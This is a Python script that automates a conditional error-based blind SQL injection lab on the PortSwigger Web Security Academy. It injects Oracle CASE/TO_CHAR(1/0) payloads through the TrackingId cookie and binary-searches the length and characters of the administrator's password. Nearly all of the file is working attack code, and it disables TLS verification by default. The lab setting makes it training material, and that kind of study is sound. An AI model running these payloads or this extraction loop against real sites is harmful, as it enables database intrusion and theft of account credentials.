import os

import requests
import urllib3


# ============================================================
# CONFIGURATION
# ============================================================

# Supply these values through environment variables.
#
# Linux/macOS:
#   export LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   export LAB_SESSION="YOUR_CURRENT_SESSION"
#   export TRACKING_PREFIX="YOUR_TRACKING_PREFIX"
#
# Windows PowerShell:
#   $env:LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   $env:LAB_SESSION="YOUR_CURRENT_SESSION"
#   $env:TRACKING_PREFIX="YOUR_TRACKING_PREFIX"

LAB_URL = os.getenv("LAB_URL")
SESSION = os.getenv("LAB_SESSION")
TRACKING_PREFIX = os.getenv("TRACKING_PREFIX")

# Expected password characters, in ASCII order
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"

# Length search bounds.
# Increase MAX_LENGTH if you want to support longer passwords.
MIN_LENGTH = 1
MAX_LENGTH = 64

# Burp proxy
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Keep the original behavior:
# TLS verification is disabled by default.
#
# Set VERIFY_TLS=true when your environment has the required
# certificate trust configured.
VERIFY_TLS = os.getenv(
    "VERIFY_TLS",
    "false"
).lower() in {
    "1",
    "true",
    "yes",
    "on",
}


# ============================================================
# SETUP
# ============================================================

if not VERIFY_TLS:
    urllib3.disable_warnings(
        urllib3.exceptions.InsecureRequestWarning
    )

session = requests.Session()
session.proxies.update(PROXIES)

session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": (
        "text/html,application/xhtml+xml,"
        "application/xml;q=0.9,*/*;q=0.8"
    ),
})


# ============================================================
# CONFIGURATION VALIDATION
# ============================================================

def validate_configuration():
    """
    Validate required runtime configuration before
    starting the SQL injection workflow.
    """

    missing = []

    if not LAB_URL:
        missing.append("LAB_URL")

    if not SESSION:
        missing.append("LAB_SESSION")

    if not TRACKING_PREFIX:
        missing.append("TRACKING_PREFIX")

    if missing:
        print("[!] Missing required environment variables:")

        for variable in missing:
            print(f"    - {variable}")

        print()
        print("[*] Example:")

        print(
            '    export LAB_URL='
            '"https://YOUR-LAB.web-security-academy.net/filter"'
        )

        print(
            '    export LAB_SESSION='
            '"YOUR_CURRENT_SESSION"'
        )

        print(
            '    export TRACKING_PREFIX='
            '"YOUR_TRACKING_PREFIX"'
        )

        return False

    return True


# ============================================================
# TRUE/FALSE DETECTOR
# ============================================================

def is_true_response(response):
    """
    The SQL expression deliberately executes 1/0 when the
    condition is TRUE.

    In this lab, if the TRUE case produces HTTP 500, this is
    sufficient.

    If your Repeater results show another difference instead,
    change this function.
    """

    return response.status_code == 500


# ============================================================
# SEND REQUEST
# ============================================================

def send_tracking_id(tracking_id):

    try:
        response = session.get(
            LAB_URL,
            params={
                "category": "Gifts"
            },
            cookies={
                "TrackingId": tracking_id,
                "session": SESSION
            },
            verify=VERIFY_TLS,
            timeout=15
        )

        return response

    except requests.RequestException as error:
        print(f"[!] Request failed: {error}")
        return None


# ============================================================
# FIND PASSWORD LENGTH
#
# Tests:
#
# LENGTH(password) > midpoint ?
#
# TRUE  -> Oracle error
# FALSE -> normal response
#
# Binary search gives O(log n)
# ============================================================

def find_password_length():

    low = MIN_LENGTH
    high = MAX_LENGTH

    print()
    print("=" * 70)
    print("[*] Finding password length")
    print("=" * 70)

    while low < high:

        midpoint = (low + high) // 2

        tracking_id = (
            TRACKING_PREFIX
            + "' AND (SELECT CASE WHEN "
            + "LENGTH(password) > "
            + str(midpoint)
            + " THEN TO_CHAR(1/0) ELSE 'a' END "
            + "FROM users WHERE username='administrator') = 'a'-- "
        )

        response = send_tracking_id(tracking_id)

        if response is None:
            return None

        true = is_true_response(response)

        print(
            f"[>] LENGTH(password) > {midpoint} "
            f"=> {'TRUE' if true else 'FALSE'} "
            f"(HTTP {response.status_code})"
        )

        if true:
            # Length is greater than midpoint
            low = midpoint + 1
        else:
            # Length is <= midpoint
            high = midpoint

    print()
    print(f"[+] Password length = {low}")

    return low


# ============================================================
# TEST CHARACTER ASCII COMPARISON
#
# Tests:
#
# ASCII(SUBSTR(password, position, 1)) > midpoint ?
#
# TRUE  -> Oracle error
# FALSE -> normal response
# ============================================================

def test_character_greater_than(position, midpoint):

    tracking_id = (
        TRACKING_PREFIX
        + "' AND (SELECT CASE WHEN "
        + "ASCII(SUBSTR(password,"
        + str(position)
        + ",1)) > "
        + str(midpoint)
        + " THEN TO_CHAR(1/0) ELSE 'a' END "
        + "FROM users WHERE username='administrator') = 'a'-- "
    )

    response = send_tracking_id(tracking_id)

    if response is None:
        return None

    return is_true_response(response)


# ============================================================
# FIND ONE CHARACTER WITH BINARY SEARCH
#
# Search indexes in:
#
# 0123456789abcdefghijklmnopqrstuvwxyz
#
# Because the characters are sorted by ASCII value, comparing
# their ASCII values lets us eliminate roughly half the
# possibilities each request.
# ============================================================

def find_character(position):

    low = 0
    high = len(CHARSET) - 1

    print()
    print("-" * 70)
    print(f"[*] Finding character at position {position}")
    print("-" * 70)

    while low < high:

        mid = (low + high) // 2

        midpoint_character = CHARSET[mid]
        midpoint_ascii = ord(midpoint_character)

        true = test_character_greater_than(
            position,
            midpoint_ascii
        )

        if true is None:
            return None

        print(
            f"[>] ASCII(password[{position}]) > "
            f"{midpoint_ascii} ('{midpoint_character}') "
            f"=> {'TRUE' if true else 'FALSE'} "
            f"| index range {low}-{high}"
        )

        if true:
            # Character is greater than midpoint
            low = mid + 1
        else:
            # Character is <= midpoint
            high = mid

    character = CHARSET[low]

    print(
        f"[+] Position {position} = '{character}'"
    )

    return character


# ============================================================
# EXTRACT PASSWORD
# ============================================================

def find_password(password_length):

    password = ""

    print()
    print("=" * 70)
    print("[*] Extracting administrator password")
    print(f"[*] Length = {password_length}")
    print("=" * 70)

    for position in range(1, password_length + 1):

        character = find_character(position)

        if character is None:
            print("[!] Could not determine character.")
            return password

        password += character

        print()
        print(
            f"[+] Password so far: {password}"
        )

    return password


# ============================================================
# MAIN
# ============================================================

def main():

    if not validate_configuration():
        return

    print()
    print("=" * 70)
    print("PORTSWIGGER CONDITIONAL ERROR-BASED BLIND SQLi")
    print("Password Length + Binary Search")
    print("=" * 70)

    print(f"[*] Target : {LAB_URL}")
    print(f"[*] Charset: {CHARSET}")
    print("[*] TRUE   : Oracle error / HTTP 500")
    print("[*] Proxy  : 127.0.0.1:8080")
    print(
        f"[*] TLS    : "
        f"{'Verification enabled' if VERIFY_TLS else 'Verification disabled'}"
    )
    print()

    # --------------------------------------------------------
    # PHASE 1: FIND LENGTH
    # --------------------------------------------------------

    password_length = find_password_length()

    if password_length is None:
        print("[!] Could not determine password length.")
        return

    # --------------------------------------------------------
    # PHASE 2: FIND PASSWORD
    # --------------------------------------------------------

    password = find_password(password_length)

    # --------------------------------------------------------
    # RESULT
    # --------------------------------------------------------

    print()
    print("=" * 70)
    print(f"[+] PASSWORD LENGTH : {password_length}")
    print(f"[+] ADMIN PASSWORD  : {password}")
    print("=" * 70)


if __name__ == "__main__":
    main()